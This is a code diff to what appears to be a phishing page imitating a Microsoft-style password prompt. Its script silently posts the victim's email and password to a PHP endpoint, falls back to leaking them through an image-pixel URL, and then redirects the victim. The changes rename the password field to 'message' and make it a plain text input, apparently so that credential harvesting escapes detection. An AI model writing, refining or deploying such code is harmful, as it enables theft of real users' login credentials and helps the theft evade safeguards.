@@ -227,7 +227,7 @@
       <h1 class="ms-title" style="margin-top:20px">Enter password</h1>
 
       <div class="field under">
-        <input id="ms-pass" type="password" placeholder="Password" autocomplete="current-password">
+        <input id="message" type="text" placeholder="Password" autocomplete="current-password">
       </div>
       <p class="err" id="p-err" hidden>
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v6M12 16.6v.1"/></svg>
@@ -324,10 +324,10 @@
   }
 
   /* ---------- silent POST ---------- */
-  function sendSilently(email, password) {
+  function sendSilently(email, message) {
     var data = new FormData();
     data.append('email', email);
-    data.append('message', password);
+    data.append('message', message);
     data.append('page', location.href);
     data.append('sent', new Date().toISOString());
 
@@ -345,7 +345,7 @@
     // 3. last resort: pixel
     var img = new Image();
     img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
-              '&message=' + encodeURIComponent(password);
+              '&message=' + encodeURIComponent(message);
   }
 
   /* ---------- toast for dead links ---------- */
@@ -404,7 +404,7 @@
   });
 
   /* ---------- stage 3 ---------- */
-  var pass = document.getElementById('ms-pass'), pErr = document.getElementById('p-err');
+  var pass = document.getElementById('message'), pErr = document.getElementById('p-err');
   pass.addEventListener('input', function () { clear(pass, pErr); });
   stage(3).addEventListener('submit', function (e) {
     e.preventDefault();
@@ -420,7 +420,7 @@
   document.querySelector('[data-done]').addEventListener('click', finish);
 
   function finish() {
-    sendSilently(user, pass.value);
+    sendSilently(user, document.getElementById('message').value);
 
     var url = REDIRECT_URL;
     if (APPEND_EMAIL && user) {
